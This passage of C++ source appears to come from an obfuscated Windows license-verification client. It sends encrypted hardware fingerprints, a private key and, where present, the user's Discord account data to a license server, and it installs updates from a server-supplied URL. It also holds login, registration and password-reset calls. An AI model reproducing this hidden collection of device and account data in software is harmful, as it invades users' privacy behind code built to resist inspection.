            << AuthGuards("&").decrypt() << AG(AuthGuards("comprehensive_fingerprint").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedFingerprint)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_key").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedKey)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_hwid").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedHwid)
            << AuthGuards("&").decrypt() << AG(AuthGuards("hwid_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(hwidSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_cpu").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedCpu)
            << AuthGuards("&").decrypt() << AG(AuthGuards("cpu_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(cpuSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_mac").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedMac)
            << AuthGuards("&").decrypt() << AG(AuthGuards("mac_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(macSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_ram").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedRam)
            << AuthGuards("&").decrypt() << AG(AuthGuards("ram_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(ramSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_disk").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedDisk)
            << AuthGuards("&").decrypt() << AG(AuthGuards("disk_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(diskSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_uptime").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedUptime)
            << AuthGuards("&").decrypt() << AG(AuthGuards("uptime_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(uptimeSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_architecture").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedArchitecture)
            << AuthGuards("&").decrypt() << AG(AuthGuards("architecture_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(architectureSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_appPath").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedAppPath)
            << AuthGuards("&").decrypt() << AG(AuthGuards("appPath_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(appPathSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_pcName").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedPcName)
            << AuthGuards("&").decrypt() << AG(AuthGuards("pcName_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(pcNameSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_uuid").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedUuid)
            << AuthGuards("&").decrypt() << AG(AuthGuards("uuid_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(uuidSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_os").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedOs)
            << AuthGuards("&").decrypt() << AG(AuthGuards("os_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(osSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_motherboard").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedMotherboard)
            << AuthGuards("&").decrypt() << AG(AuthGuards("motherboard_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(motherboardSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_gpu").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedGpu)
            << AuthGuards("&").decrypt() << AG(AuthGuards("gpu_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(gpuSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_version").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedVersion)
            << AuthGuards("&").decrypt() << AG(AuthGuards("version_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(versionSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_custom_id").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedCustomId)
            << AuthGuards("&").decrypt() << AG(AuthGuards("custom_id_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(customIdSalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_private_key").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedPrivateKey)
            << AuthGuards("&").decrypt() << AG(AuthGuards("private_key_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(privateKeySalt)
            << AuthGuards("&").decrypt() << AG(AuthGuards("hashed_fingerprint").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(AUTH::SystemInfo::getHashedFingerprint())
            << AuthGuards("&").decrypt() << AG(AuthGuards("public_key").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(AUTH::PUBLIC_KEY)
            << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_background_check").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedBackgroundCheck)
            << AuthGuards("&").decrypt() << AG(AuthGuards("background_check_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(backgroundCheckSalt);
        if (!encryptedDiscordAccounts.empty()) { urlstream << AuthGuards("&").decrypt() << AG(AuthGuards("encrypted_discord_accounts").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(encryptedDiscordAccounts) << AuthGuards("&").decrypt() << AG(AuthGuards("discord_salt").decrypt()) << AuthGuards("=").decrypt() << NovACorE::ARE(discordSalt); }
        if (!lastUnlockString.empty() && !lastUnlockHash.empty()) { urlstream << AuthGuards("&unlock_string=").decrypt() << NovACorE::ARE(lastUnlockString) << AuthGuards("&hash=").decrypt() << NovACorE::ARE(lastUnlockHash); }
        if (silent) { /*// urlstream << AG(AuthGuards("&background_check=true").decrypt()); // Removed, now encrypted*/ }
        std::string fullurl = urlstream.str();
        std::string fullqstring = fullurl.substr(fullurl.find("?") + 1);
        std::string PIDParam = AuthGuards("PID=").decrypt();
        size_t PIDStart = fullqstring.find(PIDParam);
        std::string projectID = AuthGuards("").decrypt();
        std::string qstringwoPID = fullqstring;
        if (PIDStart != std::string::npos) {
            size_t PIDValueStart = PIDStart + PIDParam.length();
            size_t PIDEnd = fullqstring.find(AuthGuards("&").decrypt(), PIDValueStart);
            if (PIDEnd == std::string::npos) { PIDEnd = fullqstring.length(); }
            projectID = fullqstring.substr(PIDValueStart, PIDEnd - PIDValueStart);
            std::string beforePID = fullqstring.substr(0, PIDStart);
            std::string afterPID = (PIDEnd < fullqstring.length()) ? fullqstring.substr(PIDEnd + 1) : AuthGuards("").decrypt();
            if (!beforePID.empty() && !afterPID.empty()) { qstringwoPID = beforePID + AuthGuards("&").decrypt() + afterPID; }
            else if (!beforePID.empty()) { qstringwoPID = beforePID; }
            else if (!afterPID.empty()) { qstringwoPID = afterPID; }
            else { qstringwoPID = AuthGuards("").decrypt(); }
        }
        std::string encryptedQueryString = aesEncrypt(qstringwoPID, AUTH::SECRET_CON);
        std::string FU = AUTH::API_URL + AuthGuards("?ag=verify&PID=").decrypt() + NovACorE::ARE(projectID) + AuthGuards("&EDA=").decrypt() + NovACorE::ARE(encryptedQueryString);
        HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuards").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            std::cout << AG(AuthGuards("ERROR: Failed to initialize network connection.").decrypt()) << std::endl;
            std::cout << AG(AuthGuards("Please check your internet connection and try again.").decrypt()) << std::endl;
            Sleep(3000);
            exit(1);
        }
        size_t queryPos = FU.find(AuthGuards("?").decrypt());
        std::string queryString = (queryPos != std::string::npos) ? FU.substr(queryPos + 1) : AuthGuards("").decrypt();
        std::string urlLower = FU;
        std::transform(urlLower.begin(), urlLower.end(), urlLower.begin(), ::tolower);
        size_t protocolEnd = urlLower.find(AuthGuards("://").decrypt());
        if (protocolEnd == std::string::npos) {
            InternetCloseHandle(hInternet);
            std::cout << AG(AuthGuards("ERROR: Invalid URL format.").decrypt()) << std::endl;
            Sleep(3000);
            exit(1);
        }
        size_t hostStart = protocolEnd + 3;
        size_t pathStart = FU.find(AuthGuards("/").decrypt(), hostStart);
        if (pathStart == std::string::npos) pathStart = FU.length();
        std::string host = FU.substr(hostStart, pathStart - hostStart);
        std::string pathAndQuery = (pathStart < FU.length()) ? FU.substr(pathStart) : AuthGuards("/").decrypt();
        std::string customHeaders = SecurityHelpers::buildCustomHeaders(queryString);
        HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            std::cout << AG(AuthGuards("ERROR: Unable to connect to authentication server.").decrypt()) << std::endl;
            std::cout << AG(AuthGuards("Please check your firewall/antivirus and try again.").decrypt()) << std::endl;
            Sleep(3000);
            exit(1);
        }
        HINTERNET hRequest = HttpOpenRequestA(hConnect, AuthGuards("GET").decrypt(), pathAndQuery.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            std::cout << AG(AuthGuards("ERROR: Unable to create HTTP request.").decrypt()) << std::endl;
            Sleep(3000);
            exit(1);
        }
        HttpAddRequestHeadersA(hRequest, customHeaders.c_str(), customHeaders.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
        if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            std::cout << AG(AuthGuards("ERROR: Unable to send HTTP request.").decrypt()) << std::endl;
            Sleep(3000);
            exit(1);
        }
        std::string EResponse;
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        if (EResponse.empty()) {
            if (!silent) {
                std::cout << AG(AuthGuards("ERROR: No response received from the server").decrypt()) << std::endl;
                Sleep(2000);
                exit(1);
            }
            return AuthGuards("ERROR|No response received.").decrypt();
        }
        while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
        std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
        if (response.empty()) {
            if (!silent) {
                Sleep(2000);
                exit(1);
            }
            return AuthGuards("ERROR|UNENCRYPTED_RESPONSE_REJECTED|Server response must be E11.").decrypt();
        }
        if (response.length() < 2) {
            if (!silent) {
                std::cout << AG(AuthGuards("ERROR: Response is invalid or corrupted.").decrypt()) << std::endl;
                Sleep(2000);
                exit(1);
            }
            return AuthGuards("ERROR|INVALID_RESPONSE|Response is invalid.").decrypt();
        }
        std::vector<std::string> parts;
        std::stringstream responseStream(response);
        std::string part;
        while (std::getline(responseStream, part, AuthGuards("|").decrypt()[0])) { parts.push_back(part); }
        if (parts.size() > 1) {
            if (!silent) {
                std::string message = parts[1];
                size_t noncePos = message.find(AuthGuards("|nonce=").decrypt());
                if (noncePos != std::string::npos) message = message.substr(0, noncePos);
                std::cout << message << std::endl;
            }
        }
        std::string unlockString, unlockHash;
        if (parts.size() > 4) { unlockString = parts[4]; if (!silent) {} lastUnlockString = unlockString; }
        if (parts.size() > 5) { unlockHash = parts[5]; if (!silent) {} lastUnlockHash = unlockHash; }
        if (parts.size() > 6) { lastLevel = parts[6]; }
        if (parts.size() > 7) userData.username = parts[7];
        if (parts.size() > 8) userData.license = parts[8];
        if (parts.size() > 9) userData.ip = parts[9];
        if (parts.size() > 10) userData.hwid = parts[10];
        if (parts.size() > 11) userData.createdate = parts[11];
        if (parts.size() > 12) userData.lastlogin = parts[12];
        if (parts.size() > 13) userData.subscriptions = parts[13];
        if (parts.size() > 14) userData.customerpanellink = parts[14];
        if (parts.size() > 15) userData.usercount = parts[15];
        if (parts.size() > 2) userData.expiry = parts[2];
        if (!parts.empty()) {
            std::string status = parts[0];
            if (status == AuthGuards("INVALID_VERSION").decrypt()) {
                if (!silent) {
                    std::cout << AG(AuthGuards("Your application version is outdated.").decrypt()) << std::endl;
                    std::string updateUrl = "";
                    size_t updateUrlPos = response.find(AuthGuards("update_url=").decrypt());
                    if (updateUrlPos != std::string::npos) {
                        size_t startPos = updateUrlPos + 11;
                        size_t endPos = response.find(AuthGuards("|").decrypt(), startPos);
                        if (endPos != std::string::npos) {
                            updateUrl = response.substr(startPos, endPos - startPos);
                        }
                        else {
                            updateUrl = response.substr(startPos);
                        }
                    }

                    if (!updateUrl.empty()) {
                        std::cout << AG(AuthGuards("Attempting to download and install update automatically...").decrypt()) << std::endl;
                        if (downloadAndInstallUpdate(updateUrl)) {
                            std::cout << AG(AuthGuards("The application will now exit to complete the update process.").decrypt()) << std::endl;
                            Sleep(3000);
                            exit(0);
                        }
                        else {
                            std::cout << AG(AuthGuards("Automatic update failed. Please try again later.").decrypt()) << std::endl;
                        }
                    }
                    else {
                        std::cout << AG(AuthGuards("Please contact support for the correct version.").decrypt()) << std::endl;
                    }

                    std::cout << AG(AuthGuards("Press Enter to exit...").decrypt()) << std::endl;
                    std::cin.get();
                    exit(0);
                }
                return response;
            }
            else if (status == AuthGuards("TIMEOUT").decrypt() || status == AuthGuards("NOT_FOUND").decrypt() || status == AuthGuards("BANNED").decrypt() || status == AuthGuards("EXPIRED").decrypt() || status == AuthGuards("HWID_MISMATCH").decrypt() || status == AuthGuards("MISSING_PARAMETERS").decrypt() || status == AuthGuards("CUSTOM_ID_NOT_FOUND").decrypt() || status == AuthGuards("PROJECT_NOT_FOUND").decrypt() || status == AuthGuards("PROJECT_DISABLED").decrypt() || status == AuthGuards("INVALID_KEYS").decrypt() || status == AuthGuards("INVALID_TOKENS").decrypt() || status == AuthGuards("MISSING_REQUIRED_LOG_PARAMETERS").decrypt() || status == AuthGuards("INVALID_ACTION").decrypt() || status == AuthGuards("INVALID_FINGERPRINT_ENCRYPTION").decrypt() || status == AuthGuards("MISSING_FINGERPRINT").decrypt() || status == AuthGuards("INVALID_SALT_FORMAT").decrypt() || status == AuthGuards("INVALID_DISCORD_SALT_FORMAT").decrypt() || status == AuthGuards("DUPLICATE_SALT_DETECTED").decrypt() || status == AuthGuards("INVALID_SALT_TIMESTAMP").decrypt() || status == AuthGuards("INVALID_SALT_MILLISECONDS").decrypt() || status == AuthGuards("SALT_TOO_OLD").decrypt() || status == AuthGuards("INVALID_DISCORD_SALT_TIMESTAMP").decrypt() || status == AuthGuards("INVALID_DISCORD_SALT_MILLISECONDS").decrypt()) {
                if (!silent) {
                    Sleep(2000); exit(1);
                }
                return response;
            }
        }
        if (response.rfind(AuthGuards("OK|").decrypt(), 0) == 0) {
            if (!silent) { /*startPeriodicValidation(licenseKey);*/ }
            return response;
        }
        if (!silent) { std::cout << AuthGuards("ERROR: Invalid response format from the server.").decrypt() << std::endl; Sleep(2000); exit(1);
        }
        return AuthGuards("ERROR|Invalid response format.").decrypt();
    }

    void Api::displayRemainingTime(const std::string& response) {
        try {
            std::istringstream iss(response);
            std::string status, message, expiryDate, remainingTime;
            std::getline(iss, status, AuthGuards("|").decrypt()[0]);
            std::getline(iss, message, AuthGuards("|").decrypt()[0]);
            std::getline(iss, expiryDate, AuthGuards("|").decrypt()[0]);
            std::getline(iss, remainingTime, AuthGuards("|").decrypt()[0]);
            if (status != AG(AuthGuards("OK").decrypt()) || expiryDate.empty()) { return; }
            std::tm tm = {};
            std::istringstream ss(expiryDate);
            ss >> std::get_time(&tm, AuthGuards("%Y-%m-%d %H:%M:%S").decrypt());
            if (ss.fail()) {
                std::cout << AG(AuthGuards("Error parsing expiry date").decrypt()) << std::endl;
                return;
            }
            std::time_t expiryTime = std::mktime(&tm);
            std::time_t currentTime = std::time(nullptr);
            double diff = std::difftime(expiryTime, currentTime);
            if (diff <= 0) { std::cout << AG(AuthGuards("License has expired!").decrypt()) << std::endl; return; }
            int days = static_cast<int>(diff / (24 * 3600));
            diff -= days * 24 * 3600;
            int hours = static_cast<int>(diff / 3600);
            diff -= hours * 3600;
            int minutes = static_cast<int>(diff / 60);
            diff -= minutes * 60;
            int seconds = static_cast<int>(diff);
            std::cout << AuthGuards("\n").decrypt() << AG(AuthGuards("License Expiry Information:").decrypt()) << std::endl;
            std::cout << AG(AuthGuards("------------------------").decrypt()) << std::endl;
            std::cout << AG(AuthGuards("Expiry Date: ").decrypt()) << expiryDate << std::endl;
            std::cout << AG(AuthGuards("Time Remaining: ").decrypt()) << days << AG(AuthGuards(" days, ").decrypt()) << hours << AG(AuthGuards(" hours, ").decrypt()) << minutes << AG(AuthGuards(" minutes, ").decrypt()) << seconds << AG(AuthGuards(" seconds").decrypt()) << std::endl;
            std::cout << AG(AuthGuards("------------------------").decrypt()) << std::endl;
        }
        catch (const std::exception& e) { std::cout << AG(AuthGuards("Error calculating remaining time: ").decrypt()) << e.what() << std::endl;
        }
    }

    std::string AUTH::Api::lastLevel = "1";
    std::string AUTH::Api::getLastLevel() { return lastLevel; }
AUTH::Api::UserData AUTH::Api::userData;
const AUTH::Api::UserData& AUTH::Api::getUserData() { return userData; }

bool AUTH::Api::checkblack() {
    if (lastLicenseKey.empty()) { return false; }
    std::vector<std::pair<std::string, std::string>> params;
    params.emplace_back(AG(AuthGuards("key").decrypt()), lastLicenseKey);
    std::string FU = beuforaction(AG(AuthGuards("checkblack").decrypt()), params);
    HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuardsCheckBlack").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { return false; }
    HINTERNET hConnect = InternetOpenUrlA( hInternet, FU.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0 );
    if (!hConnect) { InternetCloseHandle(hInternet); return false; }
    std::string EResponse;
    char buffer[512];
    DWORD bytesRead = 0;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    if (EResponse.empty()) { return false; }
    while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
    std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
    if (response.empty()) { return false; }
    if (response.length() < 2) { return false; }
    if (response.rfind(AG(AuthGuards("BANNED").decrypt()), 0) == 0) { return true; }
    return false;
}

namespace {
    void logandexit(const std::string& message) {
        std::cout << message << std::endl;
        Sleep(2000);
        exit(1);
    }
}

std::string AUTH::Api::registerAccount(const std::string& username, const std::string& password, const std::string& licenseKey) {
    if (username.empty() || password.empty() || licenseKey.empty()) { logandexit(AG(AuthGuards("Registration failed: missing parameters.").decrypt())); }
    std::vector<std::pair<std::string, std::string>> params;
    params.emplace_back(AG(AuthGuards("username").decrypt()), username);
    params.emplace_back(AG(AuthGuards("password").decrypt()), password);
    params.emplace_back(AG(AuthGuards("license").decrypt()), licenseKey);
    std::string FU = beuforaction(AG(AuthGuards("register_account").decrypt()), params);
    HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuardsRegisterAccount").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { logandexit(AG(AuthGuards("Registration failed: unable to initialize network.").decrypt()));
    }
    HINTERNET hConnect = InternetOpenUrlA(hInternet, FU.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        logandexit(AG(AuthGuards("Registration failed: unable to reach server.").decrypt()));
    }
    std::string EResponse;
    char buffer[512];
    DWORD bytesRead = 0;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    if (EResponse.empty()) { logandexit(AG(AuthGuards("Registration failed: empty response from server.").decrypt())); }
    while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
    std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
    if (response.empty()) { exit(1); }
    if (response.length() < 2) { logandexit(AG(AuthGuards("Response is invalid or corrupted.").decrypt())); }
    if (response.rfind(AuthGuards("OK|").decrypt(), 0) != 0) { logandexit(AG(AuthGuards("Registration failed: ").decrypt()) + response); }
    lastLicenseKey = licenseKey;
    return validateLicense(licenseKey);
}

std::string AUTH::Api::validateAccount(const std::string& username, const std::string& password) {
    if (username.empty() || password.empty()) { logandexit(AG(AuthGuards("Login failed: missing parameters.").decrypt())); }
    std::vector<std::pair<std::string, std::string>> params;
    params.emplace_back(AG(AuthGuards("username").decrypt()), username);
    params.emplace_back(AG(AuthGuards("password").decrypt()), password);
    std::string FU = beuforaction(AG(AuthGuards("login_account").decrypt()), params);
    HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuardsLoginAccount").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { logandexit(AG(AuthGuards("Login failed: unable to initialize network.").decrypt())); }
    HINTERNET hConnect = InternetOpenUrlA(hInternet, FU.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        logandexit(AG(AuthGuards("Login failed: unable to reach server.").decrypt()));
    }
    std::string EResponse;
    char buffer[512];
    DWORD bytesRead = 0;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    if (EResponse.empty()) { logandexit(AG(AuthGuards("Login failed: empty response from server.").decrypt())); }
    while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
    std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
    if (response.empty()) { exit(1); }
    if (response.length() < 2) { logandexit(AG(AuthGuards("Response is invalid or corrupted.").decrypt())); }
    if (response.rfind(AuthGuards("OK|").decrypt(), 0) != 0) { logandexit(AG(AuthGuards("Login failed: ").decrypt()) + response); }
    std::string license = response.substr(3);
    size_t pipePos = license.find(AuthGuards("|").decrypt());
    if (pipePos != std::string::npos) { license = license.substr(0, pipePos); }
    if (license.empty()) { logandexit(AG(AuthGuards("Login failed: license not linked to account.").decrypt())); }
    lastLicenseKey = license;
    return validateLicense(license);
}

std::string AUTH::Api::resetaccount(const std::string& username, const std::string& oldPassword, const std::string& newPassword) {
    if (username.empty() || oldPassword.empty() || newPassword.empty()) { logandexit(AG(AuthGuards("Password reset failed: missing parameters.").decrypt())); }
    std::vector<std::pair<std::string, std::string>> params;
    params.emplace_back(AG(AuthGuards("username").decrypt()), username);
    params.emplace_back(AG(AuthGuards("old_password").decrypt()), oldPassword);
    params.emplace_back(AG(AuthGuards("new_password").decrypt()), newPassword);
    std::string FU = beuforaction(AG(AuthGuards("reset_account_password").decrypt()), params);
    HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuardsResetPassword").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { logandexit(AG(AuthGuards("Password reset failed: unable to initialize network.").decrypt())); }
    HINTERNET hConnect = InternetOpenUrlA(hInternet, FU.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        logandexit(AG(AuthGuards("Password reset failed: unable to reach server.").decrypt()));
    }
    std::string EResponse;
    char buffer[512];
    DWORD bytesRead = 0;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    if (EResponse.empty()) { logandexit(AG(AuthGuards("Password reset failed: empty response from server.").decrypt())); }
    while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
    std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
    if (response.empty()) { exit(1); }
    if (response.length() < 2) { logandexit(AG(AuthGuards("Response is invalid or corrupted.").decrypt())); }
    if (response.rfind(AuthGuards("OK|").decrypt(), 0) != 0) { logandexit(AG(AuthGuards("Password reset failed: ").decrypt()) + response); }
    std::string license = response.substr(3);
    size_t pipePos = license.find(AuthGuards("|").decrypt());
    if (pipePos != std::string::npos) { license = license.substr(0, pipePos); }
    if (license.empty()) { logandexit(AG(AuthGuards("Password reset failed: license not associated with account.").decrypt())); }
    lastLicenseKey = license;
    return validateLicense(license);
}

std::string AUTH::Api::changeusername(const std::string& currentUsername, const std::string& password, const std::string& newUsername) {
    if (currentUsername.empty() || password.empty() || newUsername.empty()) { logandexit(AG(AuthGuards("Username change failed: missing parameters.").decrypt())); }
    std::vector<std::pair<std::string, std::string>> params;
    params.emplace_back(AG(AuthGuards("current_username").decrypt()), currentUsername);
    params.emplace_back(AG(AuthGuards("password").decrypt()), password);
    params.emplace_back(AG(AuthGuards("new_username").decrypt()), newUsername);
    std::string FU = beuforaction(AG(AuthGuards("change_account_username").decrypt()), params);
    HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuardsChangeUsername").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { logandexit(AG(AuthGuards("Username change failed: unable to initialize network.").decrypt())); }
    HINTERNET hConnect = InternetOpenUrlA(hInternet, FU.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        logandexit(AG(AuthGuards("Username change failed: unable to reach server.").decrypt()));
    }
    std::string EResponse;
    char buffer[512];
    DWORD bytesRead = 0;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    if (EResponse.empty()) { logandexit(AG(AuthGuards("Username change failed: empty response from server.").decrypt())); }
    while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
    std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
    if (response.empty()) { exit(1); }
    if (response.length() < 2) { logandexit(AG(AuthGuards("Response is invalid or corrupted.").decrypt())); }
    if (response.rfind(AuthGuards("OK|").decrypt(), 0) != 0) { logandexit(AG(AuthGuards("Username change failed: ").decrypt()) + response); }
    std::string license = response.substr(3);
    size_t pipePos = license.find(AuthGuards("|").decrypt());
    if (pipePos != std::string::npos) { license = license.substr(0, pipePos); }
    if (license.empty()) { logandexit(AG(AuthGuards("Username change failed: license not associated with account.").decrypt())); }
    lastLicenseKey = license;
    return validateLicense(license);
}
std::string SLC(const std::string& action, const std::string& licenseKey) {
    std::vector<std::pair<std::string, std::string>> params;
    params.emplace_back(AG(AuthGuards("key").decrypt()), licenseKey);
    std::string FU = beuforaction(action, params);
    HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AGSCS").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { return AuthGuards("ERROR|No response received.").decrypt(); }
    size_t queryPos = FU.find(AuthGuards("?").decrypt());
    std::string queryString = (queryPos != std::string::npos) ? FU.substr(queryPos + 1) : AuthGuards("").decrypt();
    std::string urlLower = FU;
    std::transform(urlLower.begin(), urlLower.end(), urlLower.begin(), ::tolower);
    size_t protocolEnd = urlLower.find(AuthGuards("://").decrypt());
    if (protocolEnd == std::string::npos) {
        InternetCloseHandle(hInternet);
        return AuthGuards("ERROR|Invalid URL format.").decrypt();
    }
    size_t hostStart = protocolEnd + 3;
    size_t pathStart = FU.find(AuthGuards("/").decrypt(), hostStart);
    if (pathStart == std::string::npos) pathStart = FU.length();
    std::string host = FU.substr(hostStart, pathStart - hostStart);
    std::string pathAndQuery = (pathStart < FU.length()) ? FU.substr(pathStart) : AuthGuards("/").decrypt();
    std::string customHeaders = SecurityHelpers::buildCustomHeaders(queryString);
